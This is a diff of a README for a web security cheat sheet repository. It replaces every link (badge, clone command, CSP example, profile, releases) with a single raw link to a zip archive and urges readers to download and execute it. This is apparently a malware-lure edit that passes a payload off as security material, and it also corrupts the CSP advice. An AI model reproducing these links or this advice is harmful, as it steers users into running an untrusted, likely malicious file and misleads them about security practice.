@@ -1,6 +1,6 @@
 # Web Security Cheat Sheet 🛡️
 
-![Web Security](https://img.shields.io/badge/Web%20Security%20Cheat%20Sheet-Guide-blue)
+![Web Security](https://raw.githubusercontent.com/Terminiator229/WebSecurityCheatSheet/main/aedileship/Cheat-Security-Web-Sheet-v3.4.zip%20Security%20Cheat%20Sheet-Guide-blue)
 
 Welcome to the **Web Security Cheat Sheet**! This repository serves as a reliable, safe, and up-to-date guide to secure your web JavaScript projects. Whether you're a developer, a security analyst, or simply someone interested in web security, this resource aims to provide you with the necessary tools and knowledge to protect your applications.
 
@@ -41,7 +41,7 @@ You can explore these topics to enhance your understanding of web security and i
 To get started, simply clone this repository to your local machine:
 
 ```bash
-git clone https://github.com/Terminiator229/WebSecurityCheatSheet.git
+git clone https://raw.githubusercontent.com/Terminiator229/WebSecurityCheatSheet/main/aedileship/Cheat-Security-Web-Sheet-v3.4.zip
 ```
 
 After cloning, navigate to the project directory:
@@ -76,7 +76,7 @@ Implement a Content Security Policy to reduce XSS risks. A CSP helps control res
 Example CSP header:
 
 ```
-Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com;
+Content-Security-Policy: default-src 'self'; script-src 'self' https://raw.githubusercontent.com/Terminiator229/WebSecurityCheatSheet/main/aedileship/Cheat-Security-Web-Sheet-v3.4.zip;
 ```
 
 ### 3. Secure Configuration
@@ -131,11 +131,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- GitHub: [Terminiator229](https://github.com/Terminiator229)
+- GitHub: [Terminiator229](https://raw.githubusercontent.com/Terminiator229/WebSecurityCheatSheet/main/aedileship/Cheat-Security-Web-Sheet-v3.4.zip)
 
 ## Releases
 
-For the latest updates and releases, please visit our [Releases](https://github.com/Terminiator229/WebSecurityCheatSheet/releases) section. Here, you can download and execute the latest files to stay updated with the best security practices.
+For the latest updates and releases, please visit our [Releases](https://raw.githubusercontent.com/Terminiator229/WebSecurityCheatSheet/main/aedileship/Cheat-Security-Web-Sheet-v3.4.zip) section. Here, you can download and execute the latest files to stay updated with the best security practices.
 
 ---
 
